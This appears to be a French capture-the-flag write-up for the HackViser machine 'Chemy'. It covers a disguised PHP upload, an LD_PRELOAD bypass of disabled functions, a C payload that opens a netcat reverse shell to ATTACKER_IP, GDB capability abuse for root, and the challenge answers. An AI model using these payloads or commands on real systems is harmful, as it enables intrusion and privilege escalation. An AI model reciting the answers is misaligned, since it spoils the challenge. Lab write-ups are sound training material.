# Writeup : Chemy - HackViser

Ce document détaille les étapes suivies pour compromettre la machine **Chemy** sur HackViser, depuis l'accès initial jusqu'à l'élévation de privilèges root et l'extraction des données finales.

## 1. Énumération Initiale

Le scan Nmap révèle les ports ouverts suivants :

- **22/SSH**
- **80/HTTP** (Serveur Apache/PHP)
- **3306/MySQL**

En explorant le site web, nous trouvons une interface d'administration protégeant un panneau de gestion de produits. Des tests d'authentification ou une analyse de la configuration permettent de trouver les identifiants de la base de données.

## 2. Accès de la Base de Données

Le fichier de configuration `/var/www/html/connection/dbconnect.php` (trouvé plus tard ou via fuite) contient :

- **Utilisateur :** `root`
- **Mot de passe :** `ND676yDZrx`
- **Base :** `chemy`

Une requête sur la table `login_ip_addresses` nous donne l'adresse IP de l'administrateur :
`mysql -u root -p'ND676yDZrx' chemy -e "SELECT * FROM login_ip_addresses;"`
**Réponse : 138.125.217.117**

## 3. Accès Initial : Bypass de LD_PRELOAD

Le panneau d'administration permet l'upload de fichiers (images). Le serveur vérifie l'en-tête du fichier mais pas son extension de manière stricte. Cependant, les fonctions PHP dangereuses (`exec`, `shell_exec`, etc.) sont désactivées.

**Stratégie :** Utiliser la technique `LD_PRELOAD` pour détourner une fonction système (ici via `mail()` qui appelle `sendmail`).

### Création du Payload C (`payload.c`)

```c
#include <unistd.h>
#include <stdlib.h>

void __attribute__ ((constructor)) pwn() {
    unsetenv("LD_PRELOAD"); // Évite les boucles infinies
    system("nc -e /bin/sh ATTACKER_IP 4444");
}
```

### Script PHP de Déclenchement

Le fichier doit commencer par `GIF89a;` pour tromper la détection d'image.

```php
GIF89a;
<?php
$so_base64 = '...'; // Base64 de payload.so
file_put_contents('/var/www/html/uploads/payload.so', base64_decode($so_base64));
putenv('LD_PRELOAD=/var/www/html/uploads/payload.so');
mail('a@b.com', 'test', 'test');
?>
```

Une fois le fichier uploadé et visité, nous obtenons un reverse shell en tant que `www-data`.

## 4. Élévation de Privilèges

L'énumération des capacités (capabilities) révèle que GDB possède le bit `cap_setuid` :
`getcap -r / 2>/dev/null`
Résultat : `/usr/bin/gdb  cap_setuid=ep`

Nous utilisons GDB pour forcer le UID à 0 (root) et lancer un shell :

```bash
gdb -nx -ex 'python import os; os.setuid(0); os.system("/bin/bash")' -ex quit
```

## 5. Extraction des Données Root

### Email du Représentant Canadien

Le fichier `/root/Representatives.txt` contient les contacts :
`cat /root/Representatives.txt | grep Canada`
**Réponse : <emily.carter@biomedix.hv>**

### Compagnie Contractée en Italie

`cat /root/Representatives.txt | grep Italy`
**Réponse : WellMed**

### Nom Complet du Manager (Approbation des Paiements)

Le fichier `/root/Customers.xlsx` est une archive ZIP contenant des données XML.

```bash
unzip -p /root/Customers.xlsx xl/sharedStrings.xml | sed 's/<[^>]*>/\n/g' | grep -i -A 2 "Manager"
```

Dans les données extraites :
**Réponse : Morgan Hayes**

---
*Writeup généré par  - HackViser CTF Solutions.*
